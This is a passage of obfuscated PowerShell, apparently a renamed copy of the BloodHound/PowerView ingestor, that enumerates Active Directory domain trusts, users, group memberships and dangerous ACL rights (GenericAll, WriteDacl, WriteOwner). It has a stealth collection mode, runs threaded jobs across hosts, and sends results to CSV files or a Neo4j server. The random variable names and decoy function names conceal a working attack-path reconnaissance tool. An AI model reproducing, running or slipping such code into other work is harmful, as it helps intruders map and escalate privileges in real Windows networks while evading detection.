                if($CmjkJYGw99 -isnot [System.Array]) {
                    $CmjkJYGw99 = @($CmjkJYGw99)
                }
                if(-not ($LDAP -or $wjlQGPFM99) ) {
                    $CmjkJYGw99 += sailfishes -CsVkrBsu99 $qgkPCptv99 -elChyFUc99 $elChyFUc99
                }
                if ($CmjkJYGw99) {
                    if($CmjkJYGw99 -isnot [System.Array]) {
                        $CmjkJYGw99 = @($CmjkJYGw99)
                    }
                    ForEach ($Trust in $CmjkJYGw99) {
                        if($Trust.SourceName -and $Trust.TargetName) {
                            $RPNizsdw99 = $Trust.SourceName
                            $kURivMze99 = $Trust.TargetName
                            $gCjYxMfT99 = $Trust.TrustType
                            $QWJTpkAw99 = $Trust.TrustDirection
                            $IGZKvYQj99 = $Trust.PSObject.TypeNames | Where-Object {$_ -match 'PowerView'} | Select-Object -First 1
                            $Null = $cYmucUIu99.Push($kURivMze99)
                            $ixZApJxZ99 = New-Object PSObject
                            $ixZApJxZ99 | Add-Member Noteproperty 'SourceDomain' "$RPNizsdw99"
                            $ixZApJxZ99 | Add-Member Noteproperty 'SourceSID' $Trust.SourceSID
                            $ixZApJxZ99 | Add-Member Noteproperty 'TargetDomain' "$kURivMze99"
                            $ixZApJxZ99 | Add-Member Noteproperty 'TargetSID' $Trust.TargetSID
                            $ixZApJxZ99 | Add-Member Noteproperty 'TrustType' "$gCjYxMfT99"
                            $ixZApJxZ99 | Add-Member Noteproperty 'TrustDirection' "$QWJTpkAw99"
                            $ixZApJxZ99.PSObject.TypeNames.Add($IGZKvYQj99)
                            $ixZApJxZ99
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[!] Error: $_"
            }
        }
    }
}
function incorrigibility {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $FSUaYgqW99,
        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $ycQbSkaw99,
        [Parameter(Position = 2)]
        [Hashtable]
        $FlXeKwGl99,
        [Int]
        [ValidateRange(1,  100)]
        $TGesMuqZ99 = 20,
        [Switch]
        $aUKUuyFV99
    )
    BEGIN {
        $IDnfNvzT99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $IDnfNvzT99.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
        if (-not $aUKUuyFV99) {
            $uvfJFPFL99 = Get-Variable -Scope 2
            $kADEZGvE99 = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')
            ForEach ($Var in $uvfJFPFL99) {
                if ($kADEZGvE99 -NotContains $Var.Name) {
                $IDnfNvzT99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }
            ForEach ($TGcvLdjd99 in (Get-ChildItem Function:)) {
                $IDnfNvzT99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $TGcvLdjd99.Name, $TGcvLdjd99.Definition))
            }
        }
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $TGesMuqZ99, $IDnfNvzT99, $Host)
        $Pool.Open()
        $qfkbdDyn99 = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $nMVIDaim99 = $M.GetParameters()
            if (($nMVIDaim99.Count -eq 2) -and $nMVIDaim99[0].Name -eq 'input' -and $nMVIDaim99[1].Name -eq 'output') {
                $qfkbdDyn99 = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }
        $Jobs = @()
        $FSUaYgqW99 = $FSUaYgqW99 | Where-Object { $_ -and ($_ -ne '') }
        Write-Verbose "[incorrigibility] Total number of hosts: $($FSUaYgqW99.count)"
        if ($TGesMuqZ99 -ge $FSUaYgqW99.Length) {
            $TGesMuqZ99 = $FSUaYgqW99.Length
        }
        $sWGkwUys99 = [Int]($FSUaYgqW99.Length/$TGesMuqZ99)
        $CvinQQEM99 = @()
        $Start = 0
        $End = $sWGkwUys99
        for($i = 1; $i -le $TGesMuqZ99; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $TGesMuqZ99) {
                $End = $FSUaYgqW99.Length
            }
            $List.AddRange($FSUaYgqW99[$Start..($End-1)])
            $Start += $sWGkwUys99
            $End += $sWGkwUys99
            $CvinQQEM99 += @(,@($List.ToArray()))
        }
        Write-Verbose "[incorrigibility] Total number of threads/partitions: $TGesMuqZ99"
        ForEach ($HlCWRCes99 in $CvinQQEM99) {
            $qeSgqMLp99 = [PowerShell]::Create()
            $qeSgqMLp99.runspacepool = $Pool
            $Null = $qeSgqMLp99.AddScript($ycQbSkaw99).AddParameter('ComputerName', $HlCWRCes99)
            if ($FlXeKwGl99) {
                ForEach ($Param in $FlXeKwGl99.GetEnumerator()) {
                    $Null = $qeSgqMLp99.AddParameter($Param.Name, $Param.Value)
                }
            }
            $lSWjiHrd99 = New-Object Management.Automation.PSDataCollection[Object]
            $Jobs += @{
                PS = $qeSgqMLp99
                Output = $lSWjiHrd99
                Result = $qfkbdDyn99.Invoke($qeSgqMLp99, @($Null, [Management.Automation.PSDataCollection[Object]]$lSWjiHrd99))
            }
        }
    }
    END {
        Write-Verbose "[incorrigibility] Threads executing"
        
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)
        Write-Verbose "[incorrigibility] Waiting 120 seconds for final cleanup..."
        Start-Sleep -Seconds 120
        ForEach ($Job in $Jobs) {
            $Job.Output.ReadAll()
            $Job.PS.Dispose()
        }
        $Pool.Dispose()
        Write-Verbose "[incorrigibility] all threads completed"
    }
}
function bargainer {
    [CmdletBinding()]
    param(
        [ValidatePattern('^GC://')]
        [String]
        $ZFsLQKbU99
    )
    if(-not $PSBoundParameters['GlobalCatalog']) {
        $NTdoptvc99 = ([ADSI]'LDAP://RootDSE').dnshostname
        $CDwHFsqK99 = "GC://$NTdoptvc99"
        Write-Verbose "Enumerated global catalog location: $CDwHFsqK99"
    }
    else {
        $CDwHFsqK99 = $ZFsLQKbU99
    }
    $taCxAoHP99 = @{}
    $tyHEpTsI99 = Get-DomainSearcher -CDwHFsqK99 $CDwHFsqK99
    $tyHEpTsI99.filter = '(samAccountType=805306368)'
    $tyHEpTsI99.PropertiesToLoad.AddRange(('samaccountname','distinguishedname', 'cn', 'objectsid'))
    ForEach($User in $tyHEpTsI99.FindAll()) {
        $QEbKYtQz99 = $User.Properties['samaccountname'][0].ToUpper()
        $KxaVNutp99 = $User.Properties['distinguishedname'][0]
        if($KxaVNutp99 -and ($KxaVNutp99 -ne '')) {
            if (($KxaVNutp99 -match 'ForeignSecurityPrincipals') -and ($KxaVNutp99 -match 'S-1-5-21')) {
                try {
                    if(-not $sKmlqiRe99) {
                        $sKmlqiRe99 = $User.Properties['cn'][0]
                    }
                    $uprSjYMm99 = (New-Object System.Security.Principal.SecurityIdentifier($User.Properties['objectsid'][0],0)).Value
                    $LJazVNhO99 = Convert-SidToName -SID $uprSjYMm99 | Convert-ADName -QwuuysVC99 'NT4' -bevdxAcf99 'Canonical'
                    if($LJazVNhO99) {
                        $VqGWUmua99 = $LJazVNhO99.Split('/')[0]
                    }
                    else {
                        Write-Verbose "Error converting $KxaVNutp99"
                        $VqGWUmua99 = $Null
                    }
                }
                catch {
                    Write-Verbose "Error converting $KxaVNutp99"
                    $VqGWUmua99 = $Null
                }
            }
            else {
                $VqGWUmua99 = ($KxaVNutp99.subString($KxaVNutp99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.').ToUpper()
            }
            if($VqGWUmua99) {
                if(-not $taCxAoHP99[$QEbKYtQz99]) {
                    $taCxAoHP99[$QEbKYtQz99] = @($VqGWUmua99)
                }
                elseif($taCxAoHP99[$QEbKYtQz99] -notcontains $VqGWUmua99) {
                    $taCxAoHP99[$QEbKYtQz99] += $VqGWUmua99
                }
            }
        }
    }
    $tyHEpTsI99.dispose()
    $taCxAoHP99
}
function grimacing {
    [CmdletBinding(DefaultParameterSetName = 'CSVExport')]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $FSUaYgqW99,
        [String]
        $DdOkjwsE99,
        [String]
        $AFHZCLFI99,
        [String]
        $qgkPCptv99,
        [String]
        $wjlQGPFM99,
        [String]
        [ValidateSet('Group', 'ACLs', 'ComputerOnly', 'LocalGroup', 'GPOLocalGroup', 'Session', 'LoggedOn', 'Stealth', 'Trusts', 'Default')]
        $FGOSfzyC99 = 'Default',
        [Switch]
        $GgHkAioq99,
        [Parameter(ParameterSetName = 'CSVExport')]
        [ValidateScript({ Test-Path -Path $_ })]
        [String]
        $ltoXFizV99 = $(Get-Location),
        [Parameter(ParameterSetName = 'CSVExport')]
        [ValidateNotNullOrEmpty()]
        [String]
        $owBChyzn99,
        [Parameter(ParameterSetName = 'RESTAPI', Mandatory = $True)]
        [URI]
        $URI,
        [Parameter(ParameterSetName = 'RESTAPI', Mandatory = $True)]
        [String]
        [ValidatePattern('.*:.*')]
        $IYOaoXev99,
        [ValidatePattern('^GC://')]
        [String]
        $ZFsLQKbU99,
        [Switch]
        $zjVeziAe99,
        [ValidateRange(1,50)]
        [Int]
        $TGesMuqZ99 = 20,
        [ValidateRange(1,5000)]
        [Int]
        $jHfLbtar99 = 1000
    )
    BEGIN {
        Switch ($FGOSfzyC99) {
            'Group'         { $evqHFAlM99 = $True; $NfoKTnNS99 = $True; $kDBrLcRl99 = $True }
            'ACLs'          { $evqHFAlM99 = $False; $NfoKTnNS99 = $True; $kDBrLcRl99 = $True; $ujKvSifs99 = $True }
            'ComputerOnly'  { $evqHFAlM99 = $False; $yDvlFBRs99 = $True; $CcJrXQJG99 = $True; $xeHUrlzx99 = $True; $kDBrLcRl99 = $False }
            'LocalGroup'    { $yDvlFBRs99 = $True; $kDBrLcRl99 = $True }
            'GPOLocalGroup' { $vIJxobkX99 = $True; $NfoKTnNS99 = $True; $kDBrLcRl99 = $True }
            'Session'       { $CcJrXQJG99 = $True; $kDBrLcRl99 = $False }
            'LoggedOn'      { $xeHUrlzx99 = $True; $kDBrLcRl99 = $True }
            'Trusts'        { $AEzEAMYx99 = $True; $NfoKTnNS99 = $True; $kDBrLcRl99 = $True }
            'Stealth'       {
                $evqHFAlM99 = $True
                $vIJxobkX99 = $True
                $CcJrXQJG99 = $True
                $AEzEAMYx99 = $True
                $kDBrLcRl99 = $False
            }
            'Default'       {
                $evqHFAlM99 = $True
                $yDvlFBRs99 = $True
                $CcJrXQJG99 = $True
                $xeHUrlzx99 = $False
                $AEzEAMYx99 = $True
                $kDBrLcRl99 = $False
            }
        }
        if($zjVeziAe99) {
            $kDBrLcRl99 = $True
        }
        $NTdoptvc99 = ([ADSI]'LDAP://RootDSE').dnshostname
        $nTQidLJa99 = "GC://$NTdoptvc99"
        $pApFYtZu99 = [regex] 'GenericAll|GenericWrite|WriteOwner|WriteDacl'
        if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
            try {
                $MCisMCsJ99 = $ltoXFizV99 | Resolve-Path -ErrorAction Stop | Select-Object -ExpandProperty Path
            }
            catch {
                throw "Error: $_"
            }
            if($owBChyzn99) {
                $MqlzohSk99 = "$($owBChyzn99)_"
            }
            else {
                $MqlzohSk99 = ''
            }
            Write-Output "Writing output to CSVs in: $MCisMCsJ99\$MqlzohSk99"
            if($CcJrXQJG99 -or $xeHUrlzx99) {
                $ctqMfJce99 = "$MCisMCsJ99\$($MqlzohSk99)user_sessions.csv"
                $wCTzWHUR99 = [System.IO.File]::Exists($ctqMfJce99)
                $DyMwSxWA99 = New-Object IO.FileStream($ctqMfJce99, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
                $LKWbVgMX99 = New-Object System.IO.StreamWriter($DyMwSxWA99)
                $LKWbVgMX99.AutoFlush = $True
                if (-not $wCTzWHUR99) {
                    $LKWbVgMX99.WriteLine('"ComputerName","UserName","Weight"')
                }
            }
            if($evqHFAlM99) {
                $zMsomWpk99 = "$MCisMCsJ99\$($MqlzohSk99)group_memberships.csv"
                $wCTzWHUR99 = [System.IO.File]::Exists($zMsomWpk99)
                $FvUkJJcN99 = New-Object IO.FileStream($zMsomWpk99, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
                $McCHcUCv99 = New-Object System.IO.StreamWriter($FvUkJJcN99)
                $McCHcUCv99.AutoFlush = $True
                if (-not $wCTzWHUR99) {
                    $McCHcUCv99.WriteLine('"GroupName","AccountName","AccountType"')
                }
            }
            if($ujKvSifs99) {
                $KWQihJNX99 = "$MCisMCsJ99\$($MqlzohSk99)acls.csv"
                $wCTzWHUR99 = [System.IO.File]::Exists($KWQihJNX99)
                $fQzBVRzW99 = New-Object IO.FileStream($KWQihJNX99, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
                $qQMJXXXe99 = New-Object System.IO.StreamWriter($fQzBVRzW99)
                $qQMJXXXe99.AutoFlush = $True
                if (-not $wCTzWHUR99) {
                    $qQMJXXXe99.WriteLine('"ObjectName","ObjectType","PrincipalName","PrincipalType","ActiveDirectoryRights","ACEType","AccessControlType","IsInherited"')
                }
            }
            if($yDvlFBRs99 -or $vIJxobkX99) {
                $yEOeggCS99 = "$MCisMCsJ99\$($MqlzohSk99)local_admins.csv"
                $wCTzWHUR99 = [System.IO.File]::Exists($yEOeggCS99)
                $kmPvvzMP99 = New-Object IO.FileStream($yEOeggCS99, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
                $iankojIc99 = New-Object System.IO.StreamWriter($kmPvvzMP99)
                $iankojIc99.AutoFlush = $True
                if (-not $wCTzWHUR99) {
                    $iankojIc99.WriteLine('"ComputerName","AccountName","AccountType"')
                }
            }
            if($AEzEAMYx99) {
                $rZcRoMUD99 = "$MCisMCsJ99\$($MqlzohSk99)trusts.csv"
                $wCTzWHUR99 = [System.IO.File]::Exists($rZcRoMUD99)
                $haotgUaW99 = New-Object IO.FileStream($rZcRoMUD99, [System.IO.FileMode]::Append, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
                $KjKeMftM99 = New-Object System.IO.StreamWriter($haotgUaW99)
                $KjKeMftM99.AutoFlush = $True
                if (-not $wCTzWHUR99) {
                    $KjKeMftM99.WriteLine('"SourceDomain","TargetDomain","TrustDirection","TrustType","Transitive"')
                }
            }
        }
        else {
            $YDGlWJUF99 = New-Object System.Net.WebClient
            $lfSDLrpV99 = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($IYOaoXev99))
            $YDGlWJUF99.Headers.Add('Accept','application/json; charset=UTF-8')
            $YDGlWJUF99.Headers.Add('Authorization',"Basic $lfSDLrpV99")
            try {
                $Null = $YDGlWJUF99.DownloadString($URI.AbsoluteUri + 'user/neo4j')
                Write-Verbose "Connection established with neo4j ingestion interface at $($URI.AbsoluteUri)"
                $QUWriZRi99 = $True
            }
            catch {
                $QUWriZRi99 = $False
                throw "Error connecting to Neo4j rest REST server at '$($URI.AbsoluteUri)'"
            }
            Write-Output "Sending output to neo4j RESTful API interface at: $($URI.AbsoluteUri)"
            $Null = [Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions")
            function ConvertTo-Json20([object] $Item){
                $ps_js = New-Object System.Web.Script.Serialization.javascriptSerializer
                return $ps_js.Serialize($item)
            }
            $QUWriZRi99 = $True
            $JQyzEjrC99 = New-Object System.Collections.ArrayList
            $Null = $JQyzEjrC99.Add( @{ "statement"="CREATE CONSTRAINT ON (c:User) ASSERT c.UserName IS UNIQUE" } )
            $Null = $JQyzEjrC99.Add( @{ "statement"="CREATE CONSTRAINT ON (c:Computer) ASSERT c.ComputerName IS UNIQUE"} )
            $Null = $JQyzEjrC99.Add( @{ "statement"="CREATE CONSTRAINT ON (c:Group) ASSERT c.GroupName IS UNIQUE" } )
            $Json = @{ "statements"=[System.Collections.Hashtable[]]$JQyzEjrC99 }
            $fhjNEnHI99 = ConvertTo-Json20 $Json
            $Null = $YDGlWJUF99.UploadString($URI.AbsoluteUri + "db/data/transaction/commit", $fhjNEnHI99)
            $JQyzEjrC99.Clear()
        }
        $taCxAoHP99 = @{}
        if(-not $kDBrLcRl99) {
            if($PSBoundParameters['GlobalCatalog']) {
                $taCxAoHP99 = bargainer -ZFsLQKbU99 $ZFsLQKbU99
            }
            else {
                $taCxAoHP99 = bargainer
            }
        }
        $hSbhhSWE99 = @{}
        if($qgkPCptv99) {
            $imELBFNB99 = @($qgkPCptv99)
        }
        elseif($GgHkAioq99) {
            $imELBFNB99 = Get-NetForestDomain | Select-Object -ExpandProperty Name
        }
        else {
            $imELBFNB99 = @( (Get-NetDomain).Name )
        }
        if($evqHFAlM99 -and $imELBFNB99) {
            $Title = (Get-Culture).TextInfo
            ForEach ($kURivMze99 in $imELBFNB99) {
                Write-Verbose "Enumerating group memberships for domain $kURivMze99"
                $FvjtcWVU99 = @{}
                $zqbFrCyu99 = @{}
                $pRsTGpGl99 = cloudless -qgkPCptv99 $kURivMze99 -wjlQGPFM99 $wjlQGPFM99
                $ZTURSZrr99 = Get-DomainSearcher -qgkPCptv99 $kURivMze99 -wjlQGPFM99 $wjlQGPFM99 -ADSPath $AFHZCLFI99
                $ZTURSZrr99.Filter = '(memberof=*)'
                $Null = $ZTURSZrr99.PropertiesToLoad.AddRange(('samaccountname', 'distinguishedname', 'cn', 'dnshostname', 'samaccounttype', 'primarygroupid', 'memberof'))
                $zIszBVLm99 = 0
                $ZTURSZrr99.FindAll() | ForEach-Object {
                    if($zIszBVLm99 % 1000 -eq 0) {
                        Write-Verbose "Group object counter: $zIszBVLm99"
                        if($McCHcUCv99) {
                            $McCHcUCv99.Flush()
                        }
                        [GC]::Collect()
                    }
                    $MzRFScgm99 = $_.Properties
                    $jHgnZMWO99 = $Null
                    $DWQsVkvv99 = $Null
                    try {
                        $jHgnZMWO99 = $MzRFScgm99['distinguishedname'][0]
                        if (($jHgnZMWO99 -match 'ForeignSecurityPrincipals') -and ($jHgnZMWO99 -match 'S-1-5-21')) {
                            try {
                                if(-not $sKmlqiRe99) {
                                    $sKmlqiRe99 = $MzRFScgm99.cn[0]
                                }
                                $LJazVNhO99 = Convert-SidToName -SID $sKmlqiRe99 | Convert-ADName -QwuuysVC99 'NT4' -bevdxAcf99 'Canonical'
                                if($LJazVNhO99) {
                                    $DWQsVkvv99 = $LJazVNhO99.Split('/')[0]
                                }
                                else {
                                    Write-Verbose "Error converting $jHgnZMWO99"
                                }
                            }
                            catch {
                                Write-Verbose "Error converting $jHgnZMWO99"
                            }
                        }
                        else {
                            $DWQsVkvv99 = $jHgnZMWO99.subString($jHgnZMWO99.IndexOf("DC=")) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {}
                    if (@('268435456','268435457','536870912','536870913') -contains $MzRFScgm99['samaccounttype']) {
                        $IGZKvYQj99 = 'group'
                        if($MzRFScgm99['samaccountname']) {
                            $otelvUUw99 = $MzRFScgm99['samaccountname'][0]
                        }
                        else {
                            try {
                                $otelvUUw99 = Convert-SidToName $MzRFScgm99['cn'][0]
                            }
                            catch {
                                $otelvUUw99 = $MzRFScgm99['cn'][0]
                            }
                        }
                        if ($otelvUUw99 -Match "\\") {
                            $VTKhDYFX99 = $otelvUUw99.split('\')[1] + '@' + $DWQsVkvv99
                        }
                        else {
                            $VTKhDYFX99 = "$otelvUUw99@$DWQsVkvv99"
                        }
                    }
                    elseif (@('805306369') -contains $MzRFScgm99['samaccounttype']) {
                        $IGZKvYQj99 = 'computer'
                        if ($MzRFScgm99['dnshostname']) {
                            $VTKhDYFX99 = $MzRFScgm99['dnshostname'][0]
                        }
                    }
                    elseif (@('805306368') -contains $MzRFScgm99['samaccounttype']) {
                        $IGZKvYQj99 = 'user'
                        if($MzRFScgm99['samaccountname']) {
                            $otelvUUw99 = $MzRFScgm99['samaccountname'][0]
                        }
                        else {
                            try {
                                $otelvUUw99 = Convert-SidToName $MzRFScgm99['cn'][0]
                            }
                            catch {
                                $otelvUUw99 = $MzRFScgm99['cn'][0]
                            }
                        }
                        if ($otelvUUw99 -Match "\\") {
                            $VTKhDYFX99 = $otelvUUw99.split('\')[1] + '@' + $DWQsVkvv99
                        }
                        else {
                            $VTKhDYFX99 = "$otelvUUw99@$DWQsVkvv99"
                        }
                    }
                    else {
                        Write-Verbose "Unknown account type for object $($MzRFScgm99['distinguishedname']) : $($MzRFScgm99['samaccounttype'])"
                    }
                    if($VTKhDYFX99 -and (-not $VTKhDYFX99.StartsWith('@'))) {
                        $UBUgkOcC99 = $Null
                        try {
                            if($VTKhDYFX99 -match $kURivMze99) {
                                if($MzRFScgm99['primarygroupid'] -and $MzRFScgm99['primarygroupid'][0] -and ($MzRFScgm99['primarygroupid'][0] -ne '')) {
                                    $xKkIHPHE99 = "$pRsTGpGl99-$($MzRFScgm99['primarygroupid'][0])"
                                    if($zqbFrCyu99[$xKkIHPHE99]) {
                                        $bKpxdYuA99 = $zqbFrCyu99[$xKkIHPHE99]
                                    }
                                    else {
                                        $MrPPCTld99 = Convert-SidToName -SID $xKkIHPHE99
                                        if ($MrPPCTld99 -notmatch '^S-1-.*') {
                                            $bKpxdYuA99 = $MrPPCTld99.split('\')[-1]
                                            $zqbFrCyu99[$xKkIHPHE99] = $bKpxdYuA99
                                        }
                                    }
                                    if ($bKpxdYuA99) {
                                        $UBUgkOcC99 = "$bKpxdYuA99@$kURivMze99"
                                    }
                                }
                                else { }
                            }
                        }
                        catch { }
                        if($UBUgkOcC99) {
                            if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
                                $McCHcUCv99.WriteLine("`"$UBUgkOcC99`",`"$VTKhDYFX99`",`"$IGZKvYQj99`"")
                            }
                            else {
                                $bBjLbJXO99 = $Title.ToTitleCase($IGZKvYQj99)
                                $Null = $JQyzEjrC99.Add( @{ "statement"="MERGE ($($IGZKvYQj99)1:$bBjLbJXO99 { name: UPPER('$VTKhDYFX99') }) MERGE (group2:Group { name: UPPER('$UBUgkOcC99') }) MERGE ($($IGZKvYQj99)1)-[:MemberOf]->(group2)" } )
                            }
                        }
                        ForEach($TmiRAdHt99 in $_.properties['memberof']) {
                            $NvYGbCFX99 = $TmiRAdHt99.subString($TmiRAdHt99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            if($FvjtcWVU99[$TmiRAdHt99]) {
                                $xJcFzwjB99 = $FvjtcWVU99[$TmiRAdHt99]
                            }
                            else {
                                $xJcFzwjB99 = Convert-ADName -QdVkYekP99 $TmiRAdHt99
                                if($xJcFzwjB99) {
                                    $xJcFzwjB99 = $xJcFzwjB99.Split('\')[-1]
                                }
                                else {
                                    $xJcFzwjB99 = $TmiRAdHt99.SubString(0, $TmiRAdHt99.IndexOf(',')).Split('=')[-1]
                                }
                                $FvjtcWVU99[$TmiRAdHt99] = $xJcFzwjB99
                            }
                            if ($PSCmdlet.ParameterSetName -eq 'CSVExport') {
                                $McCHcUCv99.WriteLine("`"$xJcFzwjB99@$NvYGbCFX99`",`"$VTKhDYFX99`",`"$IGZKvYQj99`"")
                            }
                            else {
                                $bBjLbJXO99 = $Title.ToTitleCase($IGZKvYQj99)
                                $Null = $JQyzEjrC99.Add( @{ "statement"="MERGE ($($IGZKvYQj99)1:$bBjLbJXO99 { name: UPPER('$VTKhDYFX99') }) MERGE (group2:Group { name: UPPER('$xJcFzwjB99@$NvYGbCFX99') }) MERGE ($($IGZKvYQj99)1)-[:MemberOf]->(group2)" } )
                                if ($JQyzEjrC99.Count -ge $jHfLbtar99) {
                                    $Json = @{ "statements"=[System.Collections.Hashtable[]]$JQyzEjrC99 }
                                    $fhjNEnHI99 = ConvertTo-Json20 $Json
                                    $Null = $YDGlWJUF99.UploadString($URI.AbsoluteUri + "db/data/transaction/commit", $fhjNEnHI99)
                                    $JQyzEjrC99.Clear()
                                }
                            }
                        }
                        $zIszBVLm99 += 1
                    }
                }
                $ZTURSZrr99.Dispose()
                if ($PSCmdlet.ParameterSetName -eq 'RESTAPI') {
                    $Json = @{ "statements"=[System.Collections.Hashtable[]]$JQyzEjrC99 }
                    $fhjNEnHI99 = ConvertTo-Json20 $Json
                    $Null = $YDGlWJUF99.UploadString($URI.AbsoluteUri + "db/data/transaction/commit", $fhjNEnHI99)
                    $JQyzEjrC99.Clear()
                }
                Write-Verbose "Done with group enumeration for domain $kURivMze99"
            }
            [GC]::Collect()
        }
        if($ujKvSifs99 -and $imELBFNB99) {
            $DPxLiZjT99 = @{}
            $zIszBVLm99 = 0
            $oqdcqDSq99 = @{
                'S-1-0'         = @('Null Authority', 'USER')
                'S-1-0-0'       = @('Nobody', 'USER')
                'S-1-1'         = @('World Authority', 'USER')
                'S-1-1-0'       = @('Everyone', 'GROUP')
                'S-1-2'         = @('Local Authority', 'USER')
                'S-1-2-0'       = @('Local', 'GROUP')
                'S-1-2-1'       = @('Console Logon', 'GROUP')
                'S-1-3'         = @('Creator Authority', 'USER')
                'S-1-3-0'       = @('Creator Owner', 'USER')
                'S-1-3-1'       = @('Creator Group', 'GROUP')
                'S-1-3-2'       = @('Creator Owner Server', 'COMPUTER')
                'S-1-3-3'       = @('Creator Group Server', 'COMPUTER')
                'S-1-3-4'       = @('Owner Rights', 'GROUP')
                'S-1-4'         = @('Non-unique Authority', 'USER')
                'S-1-5'         = @('NT Authority', 'USER')
                'S-1-5-1'       = @('Dialup', 'GROUP')
                'S-1-5-2'       = @('Network', 'GROUP')
                'S-1-5-3'       = @('Batch', 'GROUP')
                'S-1-5-4'       = @('Interactive', 'GROUP')
                'S-1-5-6'       = @('Service', 'GROUP')
                'S-1-5-7'       = @('Anonymous', 'GROUP')
                'S-1-5-8'       = @('Proxy', 'GROUP')
                'S-1-5-9'       = @('Enterprise Domain Controllers', 'GROUP')
                'S-1-5-10'      = @('Principal Self', 'USER')
                'S-1-5-11'      = @('Authenticated Users', 'GROUP')
                'S-1-5-12'      = @('Restricted Code', 'GROUP')
                'S-1-5-13'      = @('Terminal Server Users', 'GROUP')
                'S-1-5-14'      = @('Remote Interactive Logon', 'GROUP')
                'S-1-5-15'      = @('This Organization ', 'GROUP')
                'S-1-5-17'      = @('This Organization ', 'GROUP')
                'S-1-5-18'      = @('Local System', 'USER')
                'S-1-5-19'      = @('NT Authority', 'USER')
                'S-1-5-20'      = @('NT Authority', 'USER')
                'S-1-5-80-0'    = @('All Services ', 'GROUP')
                'S-1-5-32-544'  = @('Administrators', 'GROUP')
                'S-1-5-32-545'  = @('Users', 'GROUP')
                'S-1-5-32-546'  = @('Guests', 'GROUP')
                'S-1-5-32-547'  = @('Power Users', 'GROUP')
                'S-1-5-32-548'  = @('Account Operators', 'GROUP')
                'S-1-5-32-549'  = @('Server Operators', 'GROUP')
                'S-1-5-32-550'  = @('Print Operators', 'GROUP')
                'S-1-5-32-551'  = @('Backup Operators', 'GROUP')
                'S-1-5-32-552'  = @('Replicators', 'GROUP')
                'S-1-5-32-554'  = @('Pre-Windows 2000 Compatible Access', 'GROUP')
                'S-1-5-32-555'  = @('Remote Desktop Users', 'GROUP')
                'S-1-5-32-556'  = @('Network Configuration Operators', 'GROUP')
                'S-1-5-32-557'  = @('Incoming Forest Trust Builders', 'GROUP')
                'S-1-5-32-558'  = @('Performance Monitor Users', 'GROUP')
                'S-1-5-32-559'  = @('Performance Log Users', 'GROUP')
                'S-1-5-32-560'  = @('Windows Authorization Access Group', 'GROUP')
                'S-1-5-32-561'  = @('Terminal Server License Servers', 'GROUP')
                'S-1-5-32-562'  = @('Distributed COM Users', 'GROUP')
                'S-1-5-32-569'  = @('Cryptographic Operators', 'GROUP')
                'S-1-5-32-573'  = @('Event Log Readers', 'GROUP')
                'S-1-5-32-574'  = @('Certificate Service DCOM Access', 'GROUP')
                'S-1-5-32-575'  = @('RDS Remote Access Servers', 'GROUP')
                'S-1-5-32-576'  = @('RDS Endpoint Servers', 'GROUP')
                'S-1-5-32-577'  = @('RDS Management Servers', 'GROUP')
                'S-1-5-32-578'  = @('Hyper-V Administrators', 'GROUP')
                'S-1-5-32-579'  = @('Access Control Assistance Operators', 'GROUP')
                'S-1-5-32-580'  = @('Access Control Assistance Operators', 'GROUP')
            }
            ForEach ($kURivMze99 in $imELBFNB99) {
                Write-Verbose "Enumerating ACLs for objects in domain: $kURivMze99"
                $ZTURSZrr99 = Get-DomainSearcher -qgkPCptv99 $kURivMze99 -wjlQGPFM99 $wjlQGPFM99 -ADSPath $AFHZCLFI99
                $ZTURSZrr99.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
                $ZTURSZrr99.Filter = '(|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)(samAccountType=268435457)(samAccountType=536870912)(samAccountType=536870913))'
                $ZTURSZrr99.PropertiesToLoad.AddRange(('distinguishedName','samaccountname','dnshostname','objectclass','objectsid','name', 'ntsecuritydescriptor'))
                $ZTURSZrr99.FindAll() | ForEach-Object {
                    $Object = $_.Properties
                    if($Object -and $Object.distinguishedname -and $Object.distinguishedname[0] -and $Object.objectsid -and $Object.objectsid[0]) {
